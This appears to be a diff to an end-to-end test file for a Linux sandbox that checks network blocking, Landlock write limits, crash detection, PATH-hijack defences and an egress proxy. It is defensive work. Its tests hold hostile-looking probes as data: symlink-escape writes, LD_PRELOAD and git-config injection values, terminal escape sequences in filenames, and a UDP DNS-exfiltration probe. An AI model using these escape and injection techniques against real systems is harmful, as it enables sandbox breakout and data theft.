@@ -7,25 +7,69 @@ Run: python3 -m pytest core/sandbox/tests/test_e2e_sandbox.py -v
 """
 
 import sys as _sys
+
 import pytest as _pytest
-pytestmark = _pytest.mark.skipif(
-    _sys.platform != "linux",
-    reason="Linux-only sandbox internals (mount-ns / Landlock / seccomp / ptrace tracer / pid1 shim) — see core/sandbox/_macos_spawn.py for the macOS path",
-)
+
+from core.testing.standalone_cli import run_standalone_cli
+
+pytestmark = [
+    # Linux-only sandbox internals (mount-ns / Landlock / seccomp /
+    # ptrace tracer) on real subprocesses — see core/sandbox/
+    # _macos_spawn.py for the macOS path. Real-kernel binding.
+    _pytest.mark.linux_native,
+    # Every test in this file exercises real sandbox primitives
+    # (namespaces, Landlock, seccomp, ptrace) on real subprocesses.
+    # Opt-in via ``pytest -m integration``.
+    _pytest.mark.integration,
+]
 
 
-import os
-import subprocess
-import unittest
-from pathlib import Path
-from tempfile import TemporaryDirectory
+# Imports intentionally follow the module-level pytestmark block —
+# E402 accepted (placement is stylistic; import side effects run
+# regardless of position).
+import os  # noqa: E402
+import shutil  # noqa: E402
+import subprocess  # noqa: E402
+import unittest  # noqa: E402
+from pathlib import Path  # noqa: E402
+from tempfile import TemporaryDirectory, mkdtemp  # noqa: E402
 
-from core.sandbox import (
+import pytest
+
+from core.sandbox import (  # noqa: E402
     check_landlock_available,
     check_net_available,
     sandbox,
+)
+from core.sandbox import (  # noqa: E402
     run as sandbox_run,
 )
+from core.sandbox.tests.capability import (  # noqa: E402
+    own_pid_collides_with_sandbox_pidns,
+    pidns_isolation_available,
+)
+from core.testing.logging_state import (  # noqa: E402
+    isolated_cli_logging,
+    owned_log_handler,
+)
+
+
+@pytest.fixture(autouse=True)
+def _user_state_in_tmp(tmp_path: Path):
+    """User registries stay out of the real home: the root-conftest
+    layer doing this is stripped from release extracts (conftest.py
+    is export-ignore), so the pin must travel in-file."""
+    from core.testing.state_isolation import pin_user_state_dirs
+    with pytest.MonkeyPatch.context() as patch:
+        pin_user_state_dirs(patch, tmp_path)
+        yield
+
+
+@pytest.fixture
+def monkeypatch(_user_state_in_tmp):
+    """Undo body patches before restoring the file-owned registry pins."""
+    with pytest.MonkeyPatch.context() as patch:
+        yield patch
 
 
 class TestE2ENetworkBlocking(unittest.TestCase):
@@ -41,7 +85,19 @@ class TestE2ENetworkBlocking(unittest.TestCase):
             ["wget", "-q", "-O", "/dev/null", "http://1.1.1.1", "--timeout=2"],
             block_network=True, capture_output=True, text=True, timeout=10,
         )
+        # Strict assertion shape: a network-block test is supposed to
+        # observe wget's "could not resolve" / "connection refused"
+        # path (exit code 4 / 6 / 7 depending on wget build), NOT
+        # arbitrary nonzero. Pre-fix ``assertNotEqual(rc, 0)`` would
+        # pass on a sandbox bug that segfaulted wget or made it
+        # ENOENT — both are nonzero but neither proves network was
+        # blocked. We accept 1-127 as "network-error-ish" (rules out
+        # signal-kill and segfault which would be 128+) plus the
+        # wget-specific codes operators see on a real block.
         self.assertNotEqual(result.returncode, 0)
+        self.assertLess(result.returncode, 128,
+            f"wget returncode={result.returncode} looks like a "
+            f"signal-kill or segfault, not a network block")
 
     def test_curl_blocked(self):
         """curl inside sandbox fails with network error."""
@@ -52,14 +108,20 @@ class TestE2ENetworkBlocking(unittest.TestCase):
             ["curl", "-s", "--connect-timeout", "2", "http://1.1.1.1"],
             block_network=True, capture_output=True, text=True, timeout=10,
         )
+        # Same strict shape as test_wget_blocked above — curl exits
+        # 6 / 7 / 28 on the realistic block paths, all < 128.
         self.assertNotEqual(result.returncode, 0)
+        self.assertLess(result.returncode, 128,
+            f"curl returncode={result.returncode} looks like a "
+            f"signal-kill or segfault, not a network block")
 
     def test_python_socket_blocked(self):
         """Python socket inside sandbox fails."""
         result = sandbox_run(
             ["python3", "-c",
              "import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1', 80))"],
-            block_network=True, capture_output=True, text=True, timeout=10,
+            block_network=True, allow_path_divergence=True,
+            capture_output=True, text=True, timeout=10,
         )
         self.assertNotEqual(result.returncode, 0)
 
@@ -67,7 +129,8 @@ class TestE2ENetworkBlocking(unittest.TestCase):
         """DNS resolution inside sandbox fails."""
         result = sandbox_run(
             ["python3", "-c", "import socket; socket.getaddrinfo('example.com', 80)"],
-            block_network=True, capture_output=True, text=True, timeout=10,
+            block_network=True, allow_path_divergence=True,
+            capture_output=True, text=True, timeout=10,
         )
         self.assertNotEqual(result.returncode, 0)
 
@@ -98,8 +161,13 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
     def test_write_to_var_blocked(self):
         """Writing to /var/tmp is blocked — either by Landlock (EACCES) or
         by mount-ns (path doesn't exist in the sandbox root)."""
-        sentinel = "/var/tmp/raptor_sandbox_test"
-        self._cleanup_paths.append(sentinel)
+        # A unique dir under /var/tmp: outside every sandbox grant like a
+        # fixed name, but collision-free on hosts shared between runs.
+        # (/tmp can't host the sentinel — it is writable by design in the
+        # sandbox and masked by tmpfs under mount-ns.)
+        outside = mkdtemp(dir="/var/tmp", prefix="raptor_sandbox_test_")
+        self.addCleanup(shutil.rmtree, outside, ignore_errors=True)
+        sentinel = f"{outside}/sentinel"
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
             result = sandbox_run(
                 ["sh", "-c", f"echo evil > {sentinel} 2>&1"],
@@ -145,11 +213,42 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
             self.assertEqual(result.returncode, 0)
             self.assertEqual(Path(f"{output}/test.txt").read_text().strip(), "allowed")
 
+    def test_target_equals_output_stays_writable_under_restrict_reads(self):
+        """target == output must stay writable when restrict_reads puts
+        the target in the read allowlist.
+
+        Regression: the read allowlist forwarded the target into
+        mount-ns extra_ro_paths, which stacked an ro bind ON TOP of
+        the step-8 rw bind — every child write failed with EROFS.
+        This is the sandboxed-clone posture (clone_repository passes
+        target=output=destination parent via run_untrusted_networked,
+        restrict_reads=True)."""
+        with TemporaryDirectory() as shared:
+            result = sandbox_run(
+                ["sh", "-c", f"echo allowed > {shared}/test.txt"],
+                target=shared, output=shared,
+                restrict_reads=True,
+                capture_output=True, text=True, timeout=5,
+            )
+            self.assertEqual(
+                result.returncode, 0,
+                f"write failed: {result.stdout!r} {result.stderr!r}",
+            )
+            self.assertEqual(
+                Path(f"{shared}/test.txt").read_text().strip(), "allowed",
+            )
+
     def test_write_to_tmp_allowed(self):
         """Writing to /tmp succeeds."""
+        # Unique name: under Landlock-only the write lands on the shared
+        # host /tmp, where a fixed name would race a concurrent run and
+        # leave litter (tearDown unlinks it there; mount-ns discards it
+        # with the private tmpfs).
+        probe = f"/tmp/raptor_sandbox_test_{os.getpid()}"
+        self._cleanup_paths.append(probe)
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
             result = sandbox_run(
-                ["sh", "-c", "echo ok > /tmp/raptor_sandbox_test && cat /tmp/raptor_sandbox_test"],
+                ["sh", "-c", f"echo ok > {probe} && cat {probe}"],
                 target=target, output=output,
                 capture_output=True, text=True, timeout=5,
             )
@@ -158,12 +257,13 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
 
     def test_symlink_attack_blocked(self):
         """Symlink pointing outside allowed paths — write blocked."""
-        sentinel = "/var/tmp/raptor_test"
-        self._cleanup_paths.append(sentinel)
+        outside = mkdtemp(dir="/var/tmp", prefix="raptor_test_")
+        self.addCleanup(shutil.rmtree, outside, ignore_errors=True)
+        sentinel = f"{outside}/raptor_test"
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
-            # Create a symlink inside output pointing to /var/tmp
+            # Create a symlink inside output pointing outside every grant
             evil_link = Path(output) / "escape"
-            evil_link.symlink_to("/var/tmp")
+            evil_link.symlink_to(outside)
             sandbox_run(
                 ["sh", "-c", f"echo pwned > {output}/escape/raptor_test 2>&1"],
                 target=target, output=output,
@@ -177,8 +277,9 @@ class TestE2ELandlockWriteBlocking(unittest.TestCase):
         import core.sandbox as mod
         if mod._get_landlock_abi() < 2:
             self.skipTest("Landlock REFER requires ABI v2 (kernel 5.19+)")
-        sentinel = "/var/tmp/raptor_rename_test"
-        self._cleanup_paths.append(sentinel)
+        outside = mkdtemp(dir="/var/tmp", prefix="raptor_rename_test_")
+        self.addCleanup(shutil.rmtree, outside, ignore_errors=True)
+        sentinel = f"{outside}/renamed"
         with TemporaryDirectory() as target, TemporaryDirectory() as output:
             victim = Path(output) / "source.txt"
             victim.write_text("hello")
@@ -257,7 +358,17 @@ class TestE2EGccCompilation(unittest.TestCase):
 
 
 class TestE2ECrashObservability(unittest.TestCase):
-    """Verify sandbox captures crash evidence."""
+    """Verify sandbox captures crash evidence.
+
+    Wall budgets here are deliberately generous (60s): the run()
+    deadline starts at the go-signal, BEFORE the child builds its
+    namespaces, so the budget covers the spawn backend's whole setup
+    (userns maps, pivot_root, pid-ns fork, fresh /proc, Landlock,
+    seccomp) — measured at 5-7s on a loaded CI worker running the
+    suite in parallel, where a 5s budget timed out healthy runs. The
+    crash assertions carry these tests; the timeout only bounds a
+    genuine hang. Tightening it back re-races the nightly tier's
+    spawn latency."""
 
     def setUp(self):
         if not check_net_available():
@@ -273,30 +384,30 @@ class TestE2ECrashObservability(unittest.TestCase):
             src.write_text("int main(){*(int*)0=0;return 0;}")
             binary = Path(d) / "segv"
             subprocess.run(["gcc", "-o", str(binary), str(src)],
-                           capture_output=True, timeout=10)
+                           capture_output=True, timeout=10, check=False)
 
             result = sandbox_run(
                 [str(binary)], block_network=True,
-                capture_output=True, text=True, timeout=5,
+                capture_output=True, text=True, timeout=60,
             )
             self.assertTrue(result.sandbox_info["crashed"])
             self.assertEqual(result.sandbox_info["signal"], "SIGSEGV")
             self.assertIn("SIGSEGV", result.sandbox_info["evidence"])
 
     def test_sigabrt_detected(self):
-        """abort() captured — THE shim regression test.
+        """abort() captured — THE pid-1 signal-filter regression test.
 
-        abort() self-sends SIGABRT via `raise(SIGABRT)`. Without the
-        pid-1 shim, the target is pid-1 of the new pid-ns and the
-        kernel silently drops raise() from pid-1 (no default handler
-        → pid-ns init-signal filter applies). Result: target exits
-        rc=0 and observability loses the crash entirely.
+        abort() self-sends SIGABRT via `raise(SIGABRT)`. If the target
+        ran as pid-1 of the new pid-ns, the kernel would silently drop
+        the raise (no default handler → pid-ns init-signal filter) and
+        glibc's fallback would misreport the death as SIGSEGV — the
+        crash identity every downstream oracle keys on.
 
-        With the shim (`libexec/raptor-pid1-shim`), the target runs
-        as pid-3 so raise() goes through normally. The intermediate
-        process encodes signal-death as rc=128+6=134 (can't re-raise
-        on pid-1 either), and observe._interpret_result decodes both
-        rc<0 and 128+sig to the same crashed=True state.
+        The spawn backend's in-ns init split keeps the target at PID 2
+        so raise() goes through normally; the trusted waiter reports
+        the raw wait status over its side channel, so the parent sees
+        WIFSIGNALED (rc<0) and observe._interpret_result decodes it
+        with the mechanical waitstatus grade.
 
         Unlike SIGFPE (x86-only synchronous trap), SIGABRT is
         portable, so this test runs everywhere.
@@ -306,11 +417,11 @@ class TestE2ECrashObservability(unittest.TestCase):
             src.write_text('#include <stdlib.h>\nint main(){abort();return 0;}')
             binary = Path(d) / "abrt"
             subprocess.run(["gcc", "-o", str(binary), str(src)],
-                           capture_output=True, timeout=10)
+                           capture_output=True, timeout=10, check=False)
 
             result = sandbox_run(
                 [str(binary)], block_network=True,
-                capture_output=True, text=True, timeout=5,
+                capture_output=True, text=True, timeout=60,
             )
             self.assertTrue(result.sandbox_info["crashed"],
                             f"abort() should be detected as a crash; "
@@ -321,7 +432,7 @@ class TestE2ECrashObservability(unittest.TestCase):
         """Clean exit has no crash evidence."""
         result = sandbox_run(
             ["true"], block_network=True,
-            capture_output=True, text=True, timeout=5,
+            capture_output=True, text=True, timeout=60,
         )
         self.assertFalse(result.sandbox_info["crashed"])
 
@@ -337,7 +448,7 @@ class TestE2EResourceLimits(unittest.TestCase):
         """CPU time limit kills runaway process."""
         result = sandbox_run(
             ["python3", "-c", "while True: pass"],
-            block_network=True,
+            block_network=True, allow_path_divergence=True,
             limits={"cpu_seconds": 2},
             capture_output=True, text=True, timeout=10,
         )
@@ -349,7 +460,7 @@ class TestE2EResourceLimits(unittest.TestCase):
             sandbox_run(
                 ["python3", "-c",
                  f"f=open('{d}/big','wb'); f.write(b'A'*200*1024*1024); f.close()"],
-                block_network=True,
+                block_network=True, allow_path_divergence=True,
                 limits={"max_file_mb": 100},
                 capture_output=True, text=True, timeout=15,
             )
@@ -360,16 +471,17 @@ class TestE2EResourceLimits(unittest.TestCase):
 
 
 class TestE2EPathHijackDefeated(unittest.TestCase):
-    """Verify that PATH pollution can't hijack unshare/prlimit.
+    """Verify that PATH pollution can't hijack the sandbox's own
+    setup binaries.
 
-    The sandbox invokes `unshare` and `prlimit` to set up namespaces and
-    apply RLIMIT_NPROC. If a polluted PATH (malicious .envrc, direnv,
-    compromised shell rc) placed a fake `unshare` ahead of the real one,
-    the fake would run WITHIN Landlock+seccomp (applied in preexec) but
-    would skip the actual namespace creation — leaving the child in the
-    host's net/pid/ipc namespaces with full outbound network.
-    Fixed by resolving these binaries against a hardcoded safe bin-dir
-    list instead of PATH.
+    The sandbox invokes `unshare` for its namespace ENGAGEMENT PROBE
+    (and newuidmap/newgidmap for the uid-mapping step). If a polluted
+    PATH (malicious .envrc, direnv, compromised shell rc) placed a
+    fake `unshare` ahead of the real one, the probe would consult an
+    attacker binary to decide whether namespaces engage. Fixed by
+    resolving these binaries against a hardcoded safe bin-dir list
+    instead of PATH; the target command itself still resolves via
+    PATH as documented.
     """
 
     def setUp(self):
@@ -377,10 +489,11 @@ class TestE2EPathHijackDefeated(unittest.TestCase):
             self.skipTest("User namespaces not available")
 
     def test_path_hijack_defeated(self):
-        import os, tempfile
+        import os
+        import tempfile
+
         from core.sandbox import state as s
         saved_unshare = s._unshare_path_cache
-        saved_prlimit = s._prlimit_path_cache
         saved_net = s._net_available_cache
         saved_path = os.environ.get("PATH", "")
 
@@ -393,7 +506,6 @@ class TestE2EPathHijackDefeated(unittest.TestCase):
 
             # Clear caches and poison PATH
             s._unshare_path_cache = None
-            s._prlimit_path_cache = None
             s._net_available_cache = None
             os.environ["PATH"] = d + ":" + saved_path
 
@@ -414,7 +526,6 @@ class TestE2EPathHijackDefeated(unittest.TestCase):
                 )
             finally:
                 s._unshare_path_cache = saved_unshare
-                s._prlimit_path_cache = saved_prlimit
                 s._net_available_cache = saved_net
                 os.environ["PATH"] = saved_path
 
@@ -595,45 +706,67 @@ class TestE2ELibexecScript(unittest.TestCase):
         self._tmp.cleanup()
 
     def test_basic_execution(self):
-        result = subprocess.run(
+        result = run_standalone_cli(
             ["libexec/raptor-run-sandboxed", "echo", "hello"],
             capture_output=True, text=True, timeout=10, env=self._env,
+            check=False,
         )
-        self.assertEqual(result.returncode, 0)
+        # Carry the child's channels into the failure message: the
+        # script forwards the sandboxed child's stderr (where every
+        # sandbox fail-closed site writes its one-line reason), and a
+        # bare returncode assert made runner-only failures of this
+        # test undiagnosable from the CI log.
+        self.assertEqual(
+            result.returncode, 0,
+            f"raptor-run-sandboxed failed: "
+            f"stdout={result.stdout[-300:]!r} "
+            f"stderr={result.stderr[-500:]!r}")
         self.assertIn("hello", result.stdout)
 
     def test_network_blocked(self):
-        result = subprocess.run(
+        result = run_standalone_cli(
             ["libexec/raptor-run-sandboxed",
              "python3", "-c",
              "import socket; s=socket.socket(); s.settimeout(2); s.connect(('1.1.1.1',80))"],
             capture_output=True, text=True, timeout=10, env=self._env,
+            check=False,
         )
         self.assertNotEqual(result.returncode, 0)
 
     def test_no_args_shows_usage(self):
-        result = subprocess.run(
+        result = run_standalone_cli(
             ["libexec/raptor-run-sandboxed"],
             capture_output=True, text=True, timeout=5, env=self._env,
+            check=False,
         )
         self.assertNotEqual(result.returncode, 0)
         self.assertIn("Usage", result.stderr)
 
     def test_missing_output_dir_fails_closed(self):
-        """No OUTPUT_DIR must fail with a clear error, not silently default."""
-        env_no_output = {k: v for k, v in os.environ.items() if k != "OUTPUT_DIR"}
-        result = subprocess.run(
-            ["libexec/raptor-run-sandboxed", "echo", "hi"],
-            capture_output=True, text=True, timeout=5, env=env_no_output,
-        )
+        """No output dir resolvable must fail with a clear error that
+        names the flag, not silently default. HOME points at an empty
+        dir so the session-run-ledger fallback finds nothing — the
+        test must not pass or fail based on the invoking session's
+        live runs."""
+        with TemporaryDirectory() as empty_home:
+            env_no_output = {
+                k: v for k, v in os.environ.items() if k != "OUTPUT_DIR"}
+            env_no_output["HOME"] = empty_home
+            result = run_standalone_cli(
+                ["libexec/raptor-run-sandboxed", "echo", "hi"],
+                capture_output=True, text=True, timeout=5,
+                env=env_no_output, check=False,
+            )
         self.assertEqual(result.returncode, 1)
         self.assertIn("OUTPUT_DIR", result.stderr)
+        self.assertIn("--output-dir", result.stderr)
         self.assertIn("[sandbox] ERROR", result.stderr)
 
     def test_help_flag_exits_zero(self):
-        result = subprocess.run(
+        result = run_standalone_cli(
             ["libexec/raptor-run-sandboxed", "--help"],
             capture_output=True, text=True, timeout=5, env=self._env,
+            check=False,
         )
         self.assertEqual(result.returncode, 0)
         self.assertIn("Usage", result.stderr)
@@ -684,7 +817,7 @@ class TestE2ELandlockBitValues(unittest.TestCase):
             bin_path = Path(d) / "probe"
             compile_result = subprocess.run(
                 ["gcc", "-O0", str(src), "-o", str(bin_path)],
-                capture_output=True, text=True,
+                capture_output=True, text=True, check=False,
             )
             if compile_result.returncode != 0:
                 # Kernel headers missing (common on minimal CI).
@@ -694,6 +827,7 @@ class TestE2ELandlockBitValues(unittest.TestCase):
                 )
             result = subprocess.run(
                 [str(bin_path)], capture_output=True, text=True, timeout=5,
+                check=False,
             )
             kernel_values = {
                 k: int(v) for k, v in
@@ -737,12 +871,9 @@ class TestE2EEgressProxy(unittest.TestCase):
             self.skipTest("User namespaces not available")
         # Each test resets the proxy singleton so host registrations
         # from earlier tests don't leak into later ones.
-        from core.sandbox.proxy import _reset_for_tests
-        _reset_for_tests()
+        from core.testing.proxy_scope import isolated_proxy_scope
+        self.enterContext(isolated_proxy_scope())
 
-    def tearDown(self):
-        from core.sandbox.proxy import _reset_for_tests
-        _reset_for_tests()
 
     def test_denied_host_blocked_and_logged(self):
         """A host not in the allowlist must fail AND be recorded."""
@@ -765,22 +896,60 @@ class TestE2EEgressProxy(unittest.TestCase):
         self.assertEqual(denied[0]["host"], "evil.invalid")
 
     def test_allowed_host_succeeds(self):
-        """Host in allowlist reaches the backend."""
-        import shutil
+        """Host in allowlist reaches the backend.
+
+        github.com rather than example.com: this is the one test that
+        asserts a SUCCESSFUL live fetch, and on corporate-proxy hosts
+        the upstream proxy has its own allowlist — github.com is on
+        it everywhere RAPTOR runs (the framework's own tooling needs
+        it); example.com generally is not."""
         if not shutil.which("curl"):
             self.skipTest("curl not installed")
         r = sandbox_run(
-            ["curl", "-sI", "--max-time", "15", "https://example.com"],
+            ["curl", "-sSI", "--max-time", "15", "--write-out",
+             "%{stderr}\ncurl timings: dns=%{time_namelookup} connect=%{time_connect} "
+             "tls=%{time_appconnect} first_byte=%{time_starttransfer} total=%{time_total} "
+             "http=%{http_code} proxy_connect=%{http_connect}\n",
+             "https://github.com"],
             target="/tmp", output="/tmp",
-            use_egress_proxy=True, proxy_hosts=["example.com"],
+            use_egress_proxy=True, proxy_hosts=["github.com"],
             capture_output=True, text=True, timeout=20,
         )
-        self.assertEqual(r.returncode, 0,
-                         f"curl failed: stderr={r.stderr[:200]!r}")
         events = r.sandbox_info.get("proxy_events", [])
+        diagnostic = (
+            f"curl exit={r.returncode}; stdout={r.stdout[:2000]!r}; "
+            f"stderr={r.stderr[:2000]!r}; proxy_events={events[-8:]!r}"
+        )
+        self.assertEqual(r.returncode, 0, diagnostic)
         allowed = [e for e in events if e["result"] == "allowed"]
         self.assertGreaterEqual(len(allowed), 1,
-                                f"expected at least 1 allowed event, got {events}")
+                                f"expected at least 1 allowed event; {diagnostic}")
+
+    def test_jvm_proxy_sysprops_injected(self):
+        """JVM tools (Maven/Gradle) ignore HTTP(S)_PROXY env — the
+        sandbox must also hand the child JAVA_TOOL_OPTIONS pointing
+        the java.net proxy sysprops at the loopback egress proxy,
+        with empty nonProxyHosts (mirror of NO_PROXY="")."""
+        r = sandbox_run(
+            ["/usr/bin/env"],
+            target="/tmp", output="/tmp",
+            use_egress_proxy=True, proxy_hosts=["example.com"],
+            capture_output=True, text=True, timeout=10,
+        )
+        self.assertEqual(r.returncode, 0, r.stderr[:200])
+        env_lines = dict(
+            line.split("=", 1) for line in r.stdout.splitlines()
+            if "=" in line
+        )
+        https_proxy = env_lines.get("https_proxy", "")
+        self.assertTrue(https_proxy.startswith("http://127.0.0.1:"),
+                        f"https_proxy={https_proxy!r}")
+        port = https_proxy.rsplit(":", 1)[1]
+        jto = env_lines.get("JAVA_TOOL_OPTIONS", "")
+        self.assertIn("-Dhttps.proxyHost=127.0.0.1", jto)
+        self.assertIn(f"-Dhttps.proxyPort={port}", jto)
+        self.assertIn(f"-Dhttp.proxyPort={port}", jto)
+        self.assertIn("-Dhttp.nonProxyHosts=", jto)
 
     def test_env_None_treated_as_default(self):
         """env=None must not inherit os.environ wholesale.
@@ -845,6 +1014,26 @@ class TestE2EEgressProxy(unittest.TestCase):
             self.assertIn("GIT_CONFIG_GLOBAL=/dev/null", r.stdout)
             self.assertIn("GIT_CONFIG_SYSTEM=/dev/null", r.stdout)
             self.assertIn("MY_LEGITIMATE_VAR=kept", r.stdout)
+
+    def test_strict_env_keeps_only_exact_git_neutralisers(self):
+        """Strict filtering keeps /dev/null pins but rejects overrides."""
+        with TemporaryDirectory() as out:
+            r = sandbox_run(
+                ["env"], target=out, output=out,
+                env={
+                    "PATH": "/usr/bin",
+                    "HOME": out,
+                    "GIT_CONFIG_GLOBAL": "/dev/null",
+                    "GIT_CONFIG_SYSTEM": "/tmp/attacker-config",
+                    "LD_PRELOAD": "/tmp/attacker.so",
+                },
+                strict_env=True,
+                capture_output=True, text=True, timeout=5,
+            )
+            self.assertEqual(r.returncode, 0)
+            self.assertIn("GIT_CONFIG_GLOBAL=/dev/null", r.stdout)
+            self.assertNotIn("GIT_CONFIG_SYSTEM=", r.stdout)
+            self.assertNotIn("LD_PRELOAD=", r.stdout)
 
     def test_run_untrusted_detaches_controlling_tty(self):
         """run_untrusted must put the child in a new session (setsid) so
@@ -915,6 +1104,7 @@ class TestE2EEgressProxy(unittest.TestCase):
                 )
             self.assertIn("shell=True", str(ctx.exception))
 
+    @isolated_cli_logging(logger_names=("core.sandbox.context",))
     def test_cmd_display_sanitises_control_chars_in_argv(self):
         """Filename args from a target repo reach logger.info via cmd_display.
 
@@ -926,15 +1116,13 @@ class TestE2EEgressProxy(unittest.TestCase):
         into operator terminal output — colour flips, title changes,
         cursor moves that forge prior log lines.
         """
-        import logging, io
-        handler_buf = io.StringIO()
-        handler = logging.StreamHandler(handler_buf)
-        handler.setLevel(logging.DEBUG)
+        import io
+        import logging
         ctx_logger = logging.getLogger("core.sandbox.context")
-        prior_level = ctx_logger.level
-        ctx_logger.setLevel(logging.DEBUG)
-        ctx_logger.addHandler(handler)
-        try:
+        with io.StringIO() as handler_buf, owned_log_handler(
+            ctx_logger, logging.StreamHandler(handler_buf), level=logging.DEBUG,
+        ):
+            ctx_logger.setLevel(logging.DEBUG)
             with TemporaryDirectory() as out:
                 evil = f"{out}/evil\x1b[31m_name.txt"
                 # The command will fail (file doesn't exist) but we just
@@ -949,27 +1137,25 @@ class TestE2EEgressProxy(unittest.TestCase):
                              "cmd_display leaked a raw ESC into logger output")
             self.assertIn("\\x1b", logged,
                           "expected ESC to be escaped as \\x1b in log output")
-        finally:
-            ctx_logger.removeHandler(handler)
-            ctx_logger.setLevel(prior_level)
 
+    @isolated_cli_logging(logger_names=("core.sandbox.observe",))
     def test_asan_bug_type_sanitises_control_chars(self):
         """ASAN `bug_type` field comes from attacker-influenced stderr —
         crafted output `ERROR: AddressSanitizer: \\x1b[31mtype` would
         otherwise inject ESC into the logger via `_interpret_result`.
         Fix is a printable-char filter; this pins it.
         """
-        import logging, io, subprocess
+        import io
+        import logging
+        import subprocess
+
         from core.sandbox.observe import _interpret_result
 
-        handler_buf = io.StringIO()
-        handler = logging.StreamHandler(handler_buf)
-        handler.setLevel(logging.DEBUG)
         obs_logger = logging.getLogger("core.sandbox.observe")
-        prior_level = obs_logger.level
-        obs_logger.setLevel(logging.DEBUG)
-        obs_logger.addHandler(handler)
-        try:
+        with io.StringIO() as handler_buf, owned_log_handler(
+            obs_logger, logging.StreamHandler(handler_buf), level=logging.DEBUG,
+        ):
+            obs_logger.setLevel(logging.DEBUG)
             # Fake a CompletedProcess with ASAN-looking stderr that
             # contains an ESC in the bug type.
             fake = subprocess.CompletedProcess(
@@ -984,9 +1170,6 @@ class TestE2EEgressProxy(unittest.TestCase):
             # Also check the evidence_items entry
             self.assertIn("\\x1b", fake.sandbox_info["evidence"],
                           "evidence field should have escaped the ESC")
-        finally:
-            obs_logger.removeHandler(handler)
-            obs_logger.setLevel(prior_level)
 
     def test_proxy_rejects_control_chars_in_connect_target(self):
         """Reject CONNECT targets containing control characters.
@@ -999,7 +1182,8 @@ class TestE2EEgressProxy(unittest.TestCase):
         entries. The proxy rejects these at CONNECT-parse time.
         """
         import socket as _socket
-        from core.sandbox.proxy import get_proxy, _reset_for_tests
+
+        from core.sandbox.proxy import _reset_for_tests, get_proxy
         try:
             _reset_for_tests()
             p = get_proxy(["allowed.example.com"])
@@ -1105,7 +1289,7 @@ class TestE2EEgressProxy(unittest.TestCase):
         register/unregister API with a high event count and verifies
         every event survives.
         """
-        from core.sandbox.proxy import get_proxy, _reset_for_tests
+        from core.sandbox.proxy import _reset_for_tests, get_proxy
         try:
             _reset_for_tests()
             p = get_proxy(["probe.test"])
@@ -1137,7 +1321,7 @@ class TestE2EEgressProxy(unittest.TestCase):
         full copy of each event. No attribution mixing within a single
         sandbox's buffer beyond what its own registration window sees.
         """
-        from core.sandbox.proxy import get_proxy, _reset_for_tests
+        from core.sandbox.proxy import _reset_for_tests, get_proxy
         try:
             _reset_for_tests()
             p = get_proxy(["probe.test"])
@@ -1168,7 +1352,7 @@ class TestE2EEgressProxy(unittest.TestCase):
         Callers in finally blocks can call unregister_sandbox()
         unconditionally without guarding against partial registration.
         """
-        from core.sandbox.proxy import get_proxy, _reset_for_tests
+        from core.sandbox.proxy import _reset_for_tests, get_proxy
         try:
             _reset_for_tests()
             p = get_proxy(["probe.test"])
@@ -1223,44 +1407,49 @@ class TestE2EEgressProxy(unittest.TestCase):
                              "canary file — O_NOFOLLOW missing on the "
                              "proxy-events.jsonl write")
 
-    def test_udp_blocked_in_proxy_mode(self):
-        """Proxy mode blocks AF_INET SOCK_DGRAM via seccomp — DNS exfil closed."""
-        from core.sandbox import check_seccomp_available
-        if not check_seccomp_available():
-            self.skipTest("libseccomp not available")
-        import shutil
-        if not shutil.which("gcc"):
-            self.skipTest("gcc not installed")
+    def test_udp_contained_in_proxy_mode(self):
+        """DNS/UDP exfil is closed on BOTH proxy tiers, by different
+        mechanisms. netns tier (default where the capability exists):
+        UDP sockets may be CREATED — that is the point, gradle-class
+        tools need a loopback UDP socket at startup — but an external
+        send has no route out of the empty namespace. landlock_tcp
+        tier (no netns): seccomp denies AF_INET SOCK_DGRAM creation
+        outright."""
+        probe = (
+            "import socket, errno\n"
+            "try:\n"
+            "    u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+            "except OSError as e:\n"
+            "    print('CREATE-DENIED', errno.errorcode.get(e.errno, e.errno))\n"
+            "else:\n"
+            "    print('CREATE-OK')\n"
+            "    try:\n"
+            "        u.sendto(b'x', ('192.0.2.1', 53))\n"
+            "        print('EXTERNAL-SEND-OK')\n"
+            "    except OSError as e:\n"
+            "        print('EXTERNAL-SEND-DENIED',\n"
+            "              errno.errorcode.get(e.errno, e.errno))\n"
+        )
         with TemporaryDirectory() as d:
-            src = Path(d) / "udp_probe.c"
-            src.write_text(
-                "#include <stdio.h>\n"
-                "#include <sys/socket.h>\n"
-                "#include <errno.h>\n"
-                "int main(void){\n"
-                "  int s = socket(AF_INET, SOCK_DGRAM, 0);\n"
-                "  printf(\"rc=%d errno=%d\\n\", s, errno);\n"
-                "  return 0;\n"
-                "}\n"
-            )
-            bin_path = Path(d) / "udp_probe"
-            compile_result = sandbox_run(
-                ["gcc", "-O0", str(src), "-o", str(bin_path)],
-                block_network=True, target=d, output=d,
-                capture_output=True, text=True, timeout=15,
-            )
-            if compile_result.returncode != 0:
-                self.skipTest(f"gcc failed: {compile_result.stderr[:200]}")
             r = sandbox_run(
-                [str(bin_path)],
+                ["/usr/bin/python3", "-c", probe],
                 target=d, output=d,
                 use_egress_proxy=True, proxy_hosts=["example.com"],
-                capture_output=True, text=True, timeout=5,
+                capture_output=True, text=True, timeout=15,
             )
-            # AF_INET/SOCK_DGRAM must return EPERM (errno=1) under proxy mode.
-            self.assertIn("errno=1", r.stdout,
-                          f"UDP socket should be blocked by seccomp in proxy "
-                          f"mode; got {r.stdout!r}")
+            tier = r.sandbox_info.get("proxy_enforcement")
+            if tier == "netns":
+                self.assertIn("CREATE-OK", r.stdout,
+                              f"netns tier must allow UDP socket "
+                              f"creation (gradle): {r.stdout!r}")
+                self.assertIn("EXTERNAL-SEND-DENIED", r.stdout,
+                              f"external UDP must have no route out "
+                              f"of the empty netns: {r.stdout!r}")
+                self.assertNotIn("EXTERNAL-SEND-OK", r.stdout)
+            else:
+                self.assertIn("CREATE-DENIED", r.stdout,
+                              f"landlock_tcp tier must seccomp-deny "
+                              f"UDP creation: {r.stdout!r}")
 
 
 class TestE2ELandlockReadRestriction(unittest.TestCase):
